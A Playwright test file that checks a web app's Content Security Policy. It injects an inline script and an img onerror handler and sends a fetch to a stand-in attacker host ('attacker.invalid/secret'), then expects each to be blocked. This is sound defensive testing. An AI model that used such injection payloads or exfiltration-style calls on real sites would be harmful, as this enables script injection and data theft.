import { expect, test } from '@playwright/test';

test('production CSP permits the app but blocks injected script and foreign connections', async ({
  page,
}) => {
  const response = await page.goto('/');
  const csp = response?.headers()['content-security-policy'] ?? '';
  expect(csp).toContain("script-src 'self'");
  expect(csp).not.toContain('unsafe-eval');
  expect(csp).toContain("frame-ancestors 'none'");
  await expect(page.locator('main')).toBeVisible();
  const outcome = await page.evaluate(async () => {
    const violations: string[] = [];
    document.addEventListener('securitypolicyviolation', (event) => {
      violations.push(event.violatedDirective);
    });
    const script = document.createElement('script');
    script.textContent = 'document.documentElement.dataset.compromised = "yes"';
    document.body.append(script);
    const image = document.createElement('img');
    image.setAttribute(
      'onerror',
      'document.documentElement.dataset.compromised = "yes"',
    );
    image.src = '/missing-security-image.png';
    document.body.append(image);
    let foreignBlocked = false;
    try {
      await fetch('https://attacker.invalid/secret');
    } catch {
      foreignBlocked = true;
    }
    await new Promise((resolve) => setTimeout(resolve, 100));
    return {
      compromised: document.documentElement.dataset.compromised,
      foreignBlocked,
      violations,
    };
  });
  expect(outcome.compromised).toBeUndefined();
  expect(outcome.foreignBlocked).toBe(true);
  expect(outcome.violations).toContain('script-src-elem');
  expect(outcome.violations).toContain('connect-src');
});
